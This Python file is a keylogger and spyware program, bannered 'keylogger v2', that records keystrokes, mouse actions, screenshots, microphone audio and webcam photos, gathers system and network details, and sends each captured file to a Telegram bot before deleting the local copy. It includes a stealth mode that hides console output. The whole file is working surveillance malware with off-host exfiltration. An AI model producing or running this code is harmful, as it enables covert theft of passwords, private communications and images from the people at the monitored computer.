# Import section - External libraries
from pynput.keyboard import Key, Listener as KeyboardListener
from datetime import datetime
from PIL import ImageGrab, ImageChops
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from pathlib import Path
from pynput import mouse
from watchdog.observers import Observer
import requests
from telegram import Bot
import asyncio
import cv2
from rich.live import Live
from rich.panel import Panel
from rich.align import Align
from rich import box
import random
import string

# Import section - Standard libraries
import os
import time
import threading
import pyaudio
import wave
import argparse
import sys
import json
import socket
import platform
import psutil

# Configuration class to manage all settings and states
class Config:
    """Central configuration class for the monitoring system.
    Handles all settings, file paths, and state flags."""
    def __init__(self):
        # Base output directory
        self.output_dir = "monitoring_output"
        
        # File paths within output directory
        self.log_file = os.path.join(self.output_dir, "key_log.txt")
        self.screenshot_dir = os.path.join(self.output_dir, "screenshots")
        self.audio_dir = os.path.join(self.output_dir, "audio")
        self.system_info_file = os.path.join(self.output_dir, "system_info.json")
        self.mouse_log_file = os.path.join(self.output_dir, "mouse_log.txt")
        self.performance_log = os.path.join(self.output_dir, "performance.log")

        # Intervals and timings
        self.screenshot_interval = 10  # seconds

        # Feature flags
        self.is_recording_audio = True
        self.is_capturing_screenshots = True
        self.is_logging_keys = True
        self.enable_mouse_tracking = True
        self.enable_performance_monitoring = True
        self.screenshot_on_change = False
        self.monitor_active_window = False

        # Console interface
        self.console = Console()

        # Telegram settings
        self.telegram_token = "YOUR_BOT_TOKEN"
        self.telegram_chat_id = YOUR_CHAT_ID  # Remove quotes, should be an integer
        self.upload_interval = 60  # seconds

        # Add camera settings
        self.camera_dir = os.path.join(self.output_dir, "camera")
        self.enable_camera = True
        self.camera_interval = 30  # seconds
        self.camera_resolution = (1280, 720)  # HD resolution
        self.camera_quality = 85  # JPEG quality (0-100)

# Global instances
config = Config()
stop_event = threading.Event()

def collect_system_info():
    """Collect detailed system information."""
    try:
        info = {
            "timestamp": datetime.now().isoformat(),
            "system": {
                "hostname": socket.gethostname(),
                "os": platform.system(),
                "os_release": platform.release(),
                "os_version": platform.version(),
                "machine": platform.machine(),
                "processor": platform.processor(),
                "architecture": platform.architecture()[0],
                "python_version": platform.python_version(),
            },
            "network": {
                "ip_address": socket.gethostbyname(socket.gethostname()),
                "fqdn": socket.getfqdn(),
            },
            "hardware": {
                "cpu_cores": psutil.cpu_count(logical=False),
                "cpu_threads": psutil.cpu_count(logical=True),
                "total_memory": psutil.virtual_memory().total,
                "available_memory": psutil.virtual_memory().available,
                "disk_partitions": [{
                    "device": p.device,
                    "mountpoint": p.mountpoint,
                    "fstype": p.fstype,
                    "total_size": psutil.disk_usage(p.mountpoint).total if "cdrom" not in p.opts else None
                } for p in psutil.disk_partitions(all=False)]
            }
        }
        return info
    except Exception as e:
        config.console.print(f"[red]Error collecting system info: {e}[/red]")
        return None

def save_system_info():
    """Save system information to file."""
    try:
        # Ensure directory exists
        os.makedirs(os.path.dirname(config.system_info_file), exist_ok=True)
        
        # Collect and save info
        info = collect_system_info()
        if info:
            with open(config.system_info_file, 'w') as f:
                json.dump(info, f, indent=4)
            config.console.print("[green]✅ System information saved successfully[/green]")
        else:
            config.console.print("[red]❌ Failed to collect system information[/red]")
            
    except Exception as e:
        config.console.print(f"[red]❌ Error saving system info: {e}[/red]")

def display_status():
    """Display real-time monitoring status."""
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Component")
    table.add_column("Status")
    
    # Add system info status
    if os.path.exists(config.system_info_file):
        table.add_row("System Info", "[green]Collected[/green]")
    else:
        table.add_row("System Info", "[yellow]Pending[/yellow]")
    
    # Add mouse tracking status
    table.add_row(
        "Mouse Tracking",
        "[green]Active[/green]" if config.enable_mouse_tracking else "[red]Inactive[/red]"
    )
    
    table.add_row(
        "Keylogging",
        "[green]Active[/green]" if config.is_logging_keys else "[red]Inactive[/red]"
    )
    table.add_row(
        "Screenshots",
        "[green]Active[/green]" if config.is_capturing_screenshots else "[red]Inactive[/red]"
    )
    table.add_row(
        "Audio Recording",
        "[green]Active[/green]" if config.is_recording_audio else "[red]Inactive[/red]"
    )
    
    # Add camera status
    table.add_row(
        "Camera Monitoring",
        "[green]Active[/green]" if config.enable_camera else "[red]Inactive[/red]"
    )
    
    config.console.print(table)

def setup_directories():
    """Create necessary directories for storing monitoring data."""
    try:
        directories = [
            config.output_dir,
            config.screenshot_dir,
            config.audio_dir,
            config.camera_dir,  # Add camera directory
            os.path.dirname(config.system_info_file)
        ]
        
        for directory in directories:
            os.makedirs(directory, exist_ok=True)
            
        config.console.print(f"[green]✅ Output directories created at: {config.output_dir}[/green]")
        
        # Save initial system info
        save_system_info()
        
    except Exception as e:
        config.console.print(f"[red]❌ Error creating directories: {e}[/red]")
        sys.exit(1)

def write_to_log(message):
    """Write a message to the log file with timestamp."""
    if config.is_logging_keys:
        with open(config.log_file, "a") as f:
            f.write(message + '\n')

def format_key(key):
    """Format the key as a string, handling special keys and characters."""
    try:
        return key.char
    except AttributeError:
        if key == Key.space:
            return " "
        elif key == Key.enter:
            return "\n"
        elif key == Key.backspace:
            return "<BACKSPACE>"
        elif key == Key.tab:
            return "<TAB>"
        elif key == Key.shift:
            return "<SHIFT>"
        elif key == Key.ctrl:
            return "<CTRL>"
        elif key == Key.alt:
            return "<ALT>"
        elif key == Key.caps_lock:
            return "<CAPSLOCK>"
        elif key == Key.esc:
            return "<ESC>"
        elif key == Key.up:
            return "<UP>"
        elif key == Key.down:
            return "<DOWN>"
        elif key == Key.left:
            return "<LEFT>"
        elif key == Key.right:
            return "<RIGHT>"
        else:
            return f"<{key.name.upper()}>"

def on_press(key):
    """Handle key press events and write them to the log file."""
    key_str = format_key(key)
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    message = f"{timestamp} - {key_str}"
    write_to_log(message)

def on_release(key):
    """Stop the listener and recording when 'Esc' is pressed."""
    if key == Key.esc:
        config.console.print("\n[yellow]Stopping all recording activities...[/yellow]")
        stop_event.set()  # Signal all threads to stop
        return False  # Stop the listener

def capture_screenshots(interval=10):
    """Capture screenshots at regular intervals."""
    if not config.is_capturing_screenshots:
        return
        
    while not stop_event.is_set():
        try:
            screenshot = ImageGrab.grab()
            timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
            filename = os.path.join(config.screenshot_dir, f"screenshot_{timestamp}.png")
            screenshot.save(filename)
            print(f"Screenshot saved: {filename}")
            time.sleep(interval)
        except Exception as e:
            print(f"Error capturing screenshot: {e}")
            time.sleep(interval)

def record_audio():
    """Record audio in 50-second chunks."""
    if not config.is_recording_audio:
        return

    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    RECORD_SECONDS = 50  # Changed to 50 seconds
    FRAMES_PER_CHUNK = int(RATE / CHUNK * RECORD_SECONDS)

    try:
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT,
                       channels=CHANNELS,
                       rate=RATE,
                       input=True,
                       frames_per_buffer=CHUNK)

        config.console.print("[green]🎤 Started audio recording in 50s chunks[/green]")

        while not stop_event.is_set():
            frames = []
            # Record for RECORD_SECONDS
            for _ in range(FRAMES_PER_CHUNK):
                if stop_event.is_set():
                    break
                try:
                    data = stream.read(CHUNK, exception_on_overflow=False)
                    frames.append(data)
                except Exception as e:
                    config.console.print(f"[yellow]⚠️ Audio chunk read error: {e}[/yellow]")
                    continue

            # Save the recording if we have data
            if frames:
                timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
                audio_file = os.path.join(config.audio_dir, f"audio_{timestamp}.wav")
                
                try:
                    wf = wave.open(audio_file, 'wb')
                    wf.setnchannels(CHANNELS)
                    wf.setsampwidth(p.get_sample_size(FORMAT))
                    wf.setframerate(RATE)
                    wf.writeframes(b''.join(frames))
                    wf.close()
                    config.console.print(f"[green]✅ Saved 50s audio: {os.path.basename(audio_file)}[/green]")
                except Exception as e:
                    config.console.print(f"[red]❌ Error saving audio: {e}[/red]")

    except Exception as e:
        config.console.print(f"[red]❌ Error in audio recording: {e}[/red]")
    finally:
        try:
            stream.stop_stream()
            stream.close()
            p.terminate()
            config.console.print("[yellow]🛑 Audio recording stopped[/yellow]")
        except Exception as e:
            config.console.print(f"[red]❌ Error cleaning up audio: {e}[/red]")

def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description="Advanced System Monitoring Tool")
    parser.add_argument('-k', '--no-keylog', action='store_true', help='Disable keylogging')
    parser.add_argument('-s', '--no-screenshots', action='store_true', help='Disable screenshots')
    parser.add_argument('-a', '--no-audio', action='store_true', help='Disable audio recording')
    parser.add_argument('-i', '--interval', type=int, default=10, help='Screenshot interval in seconds')
    parser.add_argument('--output-dir', 
                       help='Custom output directory (default: monitoring_output)',
                       default='monitoring_output')
    parser.add_argument('--stealth', action='store_true', help='Run in stealth mode (no console output)')
    parser.add_argument('--mouse', action='store_true', help='Enable mouse tracking')
    parser.add_argument('--performance', action='store_true', help='Enable performance monitoring')
    parser.add_argument('--screenshot-changes', action='store_true', help='Capture screenshots on content change')
    parser.add_argument('--active-window', action='store_true', help='Capture only active window')
    parser.add_argument('--no-camera', action='store_true',
                       help='Disable camera monitoring')
    parser.add_argument('--camera-interval', type=int, default=30,
                       help='Camera capture interval in seconds')
    parser.add_argument('--camera-resolution', type=str, default='1280x720',
                       help='Camera resolution (e.g., 1280x720)')
    args = parser.parse_args()
    
    # Update config with custom output directory if specified
    if args.output_dir:
        config.output_dir = args.output_dir
        # Update all paths with new base directory
        config.log_file = os.path.join(config.output_dir, "key_log.txt")
        config.screenshot_dir = os.path.join(config.output_dir, "screenshots")
        config.audio_dir = os.path.join(config.output_dir, "audio")
        config.system_info_file = os.path.join(config.output_dir, "system_info.json")
        config.mouse_log_file = os.path.join(config.output_dir, "mouse_log.txt")
        config.performance_log = os.path.join(config.output_dir, "performance.log")
    
    return args

async def upload_to_telegram(filepath):
    """Upload a file to Telegram with enhanced error handling."""
    MAX_RETRIES = 3
    TIMEOUT = 30  # seconds

    for attempt in range(MAX_RETRIES):
        try:
            bot = Bot(token=config.telegram_token)
            
            # Validate file
            if not os.path.exists(filepath):
                config.console.print(f"[yellow]⚠️ File not found: {filepath}[/yellow]")
                return False
                
            if os.path.getsize(filepath) == 0:
                config.console.print(f"[yellow]⚠️ Empty file: {filepath}[/yellow]")
                return False

            # Show upload attempt
            if attempt > 0:
                config.console.print(f"[yellow]↻ Retry {attempt+1}/{MAX_RETRIES}: {os.path.basename(filepath)}[/yellow]")
            else:
                config.console.print(f"[cyan]↑ Uploading: {os.path.basename(filepath)}...[/cyan]")

            # Read and upload file
            with open(filepath, 'rb') as file:
                file_content = file.read()
                file_size = len(file_content) / 1024  # KB
                
                try:
                    if filepath.endswith(('.txt', '.log', '.json')):
                        message = await asyncio.wait_for(
                            bot.send_document(
                                chat_id=config.telegram_chat_id,
                                document=file_content,
                                filename=os.path.basename(filepath),
                                caption=f"📄 Log from {socket.gethostname()} ({file_size:.1f}KB)"
                            ),
                            timeout=TIMEOUT
                        )
                    elif filepath.endswith(('.png', '.jpg')):
                        message = await asyncio.wait_for(
                            bot.send_photo(
                                chat_id=config.telegram_chat_id,
                                photo=file_content,
                                caption=f"📸 Screenshot from {socket.gethostname()} ({file_size:.1f}KB)"
                            ),
                            timeout=TIMEOUT
                        )
                    elif filepath.endswith('.wav'):
                        message = await asyncio.wait_for(
                            bot.send_audio(
                                chat_id=config.telegram_chat_id,
                                audio=file_content,
                                title=os.path.basename(filepath),
                                caption=f"🎤 Audio from {socket.gethostname()} ({file_size:.1f}KB)"
                            ),
                            timeout=TIMEOUT
                        )
                    
                    if message:
                        config.console.print(f"[green]✅ Successfully uploaded: {os.path.basename(filepath)} ({file_size:.1f}KB)[/green]")
                        return True
                    
                except asyncio.TimeoutError:
                    config.console.print(f"[yellow]⌛ Upload timeout for {os.path.basename(filepath)}. Retrying...[/yellow]")
                    continue
                    
        except Exception as e:
            error_msg = str(e)
            if "Too Many Requests" in error_msg:
                wait_time = 30
                config.console.print(f"[yellow]⚠️ Rate limit hit. Waiting {wait_time}s...[/yellow]")
                time.sleep(wait_time)
                continue
            elif "Request Entity Too Large" in error_msg:
                config.console.print(f"[red]❌ File too large: {os.path.basename(filepath)}[/red]")
                return False
            else:
                config.console.print(f"[red]❌ Error uploading {os.path.basename(filepath)}: {error_msg}[/red]")
                if attempt < MAX_RETRIES - 1:
                    time.sleep(2 * (attempt + 1))  # Exponential backoff
                    continue
                return False

    config.console.print(f"[red]❌ Failed to upload after {MAX_RETRIES} attempts: {os.path.basename(filepath)}[/red]")
    return False

def telegram_uploader():
    """Enhanced file uploader with better error handling."""
    SCAN_INTERVAL = 5
    
    while not stop_event.is_set():
        try:
            uploaded_files = set()
            
            for root, _, files in os.walk(config.output_dir):
                for filename in sorted(files):  # Process files in order
                    if stop_event.is_set():
                        return
                        
                    filepath = os.path.join(root, filename)
                    if filepath in uploaded_files:
                        continue
                        
                    # Skip files being written
                    try:
                        size1 = os.path.getsize(filepath)
                        time.sleep(0.5)
                        size2 = os.path.getsize(filepath)
                        if size1 != size2:
                            continue
                    except (OSError, IOError):
                        continue

                    success = asyncio.run(upload_to_telegram(filepath))
                    if success:
                        try:
                            os.remove(filepath)
                            uploaded_files.add(filepath)
                        except Exception as e:
                            config.console.print(f"[yellow]⚠️ Could not delete {filename}: {e}[/yellow]")
                    
            time.sleep(SCAN_INTERVAL)
            
        except Exception as e:
            config.console.print(f"[red]❌ Uploader error: {e}[/red]")
            time.sleep(SCAN_INTERVAL)

def display_banner():
    """Display the startup banner."""
    banner = r"""
[bold green]
  _            _                              ___ 
 | |_____ _  _| |___  __ _ __ _ ___ _ _  __ _|_  )
 | / / -_) || | / _ \/ _` / _` / -_) '_| \ V // / 
 |_\_\___|\_, |_\___/\__, \__, \___|_|    \_//___|
          |__/       |___/|___/                    
[/bold green]"""
    
    config.console.print(banner)
    config.console.print("\n[yellow]Advanced System Monitoring Tool V2[/yellow]")
    config.console.print("[cyan]Press ESC to stop monitoring[/cyan]\n")

def main():
    """Main entry point of the monitoring system."""
    global args
    args = parse_arguments()
    
    # Setup directories and initial configurations
    setup_directories()
    
    # Show banner and status if not in stealth mode
    if not args.stealth:
        display_banner()
        display_status()
    
    # Initialize keyboard listener
    listener = KeyboardListener(on_press=on_press, on_release=on_release)
    
    threads = []

    # Initialize mouse tracking if enabled
    if config.enable_mouse_tracking:
        mouse_listener = monitor_mouse()
        mouse_listener.start()
        threads.append(mouse_listener)

    # Initialize performance monitoring if enabled
    if config.enable_performance_monitoring:
        perf_thread = threading.Thread(target=monitor_performance, daemon=True)
        threads.append(perf_thread)

    # Initialize screenshot capture if enabled
    if config.is_capturing_screenshots:
        screenshot_thread = threading.Thread(
            target=capture_screenshots, 
            args=(config.screenshot_interval,), 
            daemon=True
        )
        threads.append(screenshot_thread)

    # Initialize audio recording if enabled
    if config.is_recording_audio:
        audio_thread = threading.Thread(target=record_audio, daemon=True)
        threads.append(audio_thread)

    # Add Telegram upload thread
    telegram_thread = threading.Thread(target=telegram_uploader, daemon=True)
    threads.append(telegram_thread)

    # Initialize camera monitoring if enabled
    if config.enable_camera:
        camera_thread = threading.Thread(target=capture_camera, daemon=True)
        threads.append(camera_thread)

    # Start all non-listener threads
    for thread in threads:
        if not isinstance(thread, (mouse.Listener, KeyboardListener)):
            thread.start()

    try:
        # Start progress display
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            transient=True,
        ) as progress:
            progress.add_task(description="Monitoring system...", total=None)
            listener.start()  # Start keyboard listener
            
            # Wait for stop event or keyboard interrupt
            while not stop_event.is_set():
                time.sleep(0.1)
            
            # Cleanup
            listener.stop()
            
        # Wait for all threads to finish
        for thread in threads:
            if thread.is_alive():
                thread.join(timeout=1)  # Add timeout to prevent hanging

        if not args.stealth:
            config.console.print("\n[bold red]=== Monitoring Stopped ===")
            config.console.print("[green]All data has been saved successfully.[/green]")
            
    except KeyboardInterrupt:
        stop_event.set()
        config.console.print("\n[bold red]Emergency shutdown initiated.[/bold red]")

def monitor_mouse():
    """Monitor mouse movements and clicks."""
    def on_move(x, y):
        if not stop_event.is_set():
            with open(config.mouse_log_file, "a") as f:
                f.write(f"{datetime.now().isoformat()} - Mouse moved to ({x}, {y})\n")

    def on_click(x, y, button, pressed):
        if not stop_event.is_set():
            with open(config.mouse_log_file, "a") as f:
                action = "pressed" if pressed else "released"
                f.write(f"{datetime.now().isoformat()} - {button} {action} at ({x}, {y})\n")
        return not stop_event.is_set()  # Stop listener if stop_event is set

    def on_scroll(x, y, dx, dy):
        if not stop_event.is_set():
            with open(config.mouse_log_file, "a") as f:
                f.write(f"{datetime.now().isoformat()} - Scrolled {'down' if dy < 0 else 'up'} at ({x}, {y})\n")

    return mouse.Listener(
        on_move=on_move,
        on_click=on_click,
        on_scroll=on_scroll,
        daemon=True
    )

def capture_active_window():
    """Capture only the active window."""
    try:
        if platform.system() == 'Darwin':  # macOS
            from Quartz import CGWindowListCopyWindowInfo, kCGWindowListOptionOnScreenOnly, kCGNullWindowID
            windows = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly, kCGNullWindowID)
            for window in windows:
                if window.valueForKey_('kCGWindowLayer') == 0:
                    # This is the frontmost window
                    screenshot = ImageGrab.grab()
                    return screenshot
        else:  # Windows/Linux
            screenshot = ImageGrab.grab()
            return screenshot
    except Exception as e:
        config.console.print(f"[red]Error capturing active window: {e}[/red]")
        return None

def capture_screen_on_change(threshold=0.1):
    """Capture screenshot only when screen content changes."""
    last_screenshot = None
    while not stop_event.is_set():
        try:
            current_screenshot = ImageGrab.grab()
            if last_screenshot:
                # Compare screenshots
                diff = ImageChops.difference(last_screenshot, current_screenshot)
                if diff.getbbox():
                    # Images are different
                    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
                    filename = os.path.join(config.screenshot_dir, f"change_{timestamp}.png")
                    current_screenshot.save(filename)
                    config.console.print(f"[cyan]Change detected - Screenshot saved: {filename}[/cyan]")
            last_screenshot = current_screenshot
            time.sleep(1)
        except Exception as e:
            config.console.print(f"[red]Error in change detection: {e}[/red]")
            time.sleep(1)

def monitor_performance():
    """Monitor and log system performance metrics."""
    while not stop_event.is_set():
        try:
            metrics = {
                "timestamp": datetime.now().isoformat(),
                "cpu": {
                    "percent": psutil.cpu_percent(interval=1),
                    "frequency": psutil.cpu_freq()._asdict() if psutil.cpu_freq() else None
                },
                "memory": {
                    "percent": psutil.virtual_memory().percent,
                    "used": psutil.virtual_memory().used,
                    "total": psutil.virtual_memory().total
                },
                "disk": {
                    "percent": psutil.disk_usage('/').percent,
                    "used": psutil.disk_usage('/').used,
                    "total": psutil.disk_usage('/').total
                }
            }
            
            # Save metrics to performance log
            with open(config.performance_log, "a") as f:
                json.dump(metrics, f)
                f.write('\n')
            
            # Display metrics if not in stealth mode
            if not args.stealth:
                config.console.print(f"[cyan]CPU: {metrics['cpu']['percent']}% | "
                                  f"Memory: {metrics['memory']['percent']}% | "
                                  f"Disk: {metrics['disk']['percent']}%[/cyan]")
            
            time.sleep(5)  # Update every 5 seconds
            
        except Exception as e:
            config.console.print(f"[red]Error monitoring performance: {e}[/red]")
            time.sleep(1)

def capture_camera():
    """Capture photos from webcam at regular intervals."""
    if not config.enable_camera:
        return

    camera = None
    last_capture_time = 0
    failed_attempts = 0
    MAX_FAILURES = 3

    while not stop_event.is_set():
        try:
            current_time = time.time()
            
            # Initialize or reinitialize camera if needed
            if camera is None:
                camera = cv2.VideoCapture(0)
                camera.set(cv2.CAP_PROP_FRAME_WIDTH, config.camera_resolution[0])
                camera.set(cv2.CAP_PROP_FRAME_HEIGHT, config.camera_resolution[1])
                if not camera.isOpened():
                    raise Exception("Could not access webcam")
                config.console.print("[green]📸 Camera initialized successfully[/green]")
                
            # Check if it's time for next capture
            if current_time - last_capture_time >= config.camera_interval:
                # Capture frame
                ret, frame = camera.read()
                if not ret or frame is None:
                    raise Exception("Failed to capture frame")

                # Generate filename with timestamp
                timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
                filename = os.path.join(config.camera_dir, f"camera_{timestamp}.jpg")

                # Save image with specified quality
                cv2.imwrite(filename, frame, 
                          [cv2.IMWRITE_JPEG_QUALITY, config.camera_quality])

                # Update last capture time
                last_capture_time = current_time
                failed_attempts = 0  # Reset failure counter on success

                if not args.stealth:
                    config.console.print(f"[green]✅ Camera photo captured: {os.path.basename(filename)}[/green]")

            time.sleep(1)  # Short sleep to prevent CPU overuse

        except Exception as e:
            failed_attempts += 1
            error_msg = str(e)
            config.console.print(f"[yellow]⚠️ Camera error: {error_msg}[/yellow]")

            # Clean up camera on error
            if camera is not None:
                camera.release()
                camera = None

            # If too many failures, wait longer before retry
            if failed_attempts >= MAX_FAILURES:
                wait_time = min(300, 30 * failed_attempts)  # Max 5 minutes
                config.console.print(f"[red]❌ Multiple camera failures. Waiting {wait_time}s before retry...[/red]")
                time.sleep(wait_time)
            else:
                time.sleep(5)  # Short wait between retries

    # Cleanup
    if camera is not None:
        camera.release()
        config.console.print("[yellow]🛑 Camera monitoring stopped[/yellow]")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        stop_event.set()
        config.console.print("\n[bold red]System terminated by user.[/bold red]")
        sys.exit(0)
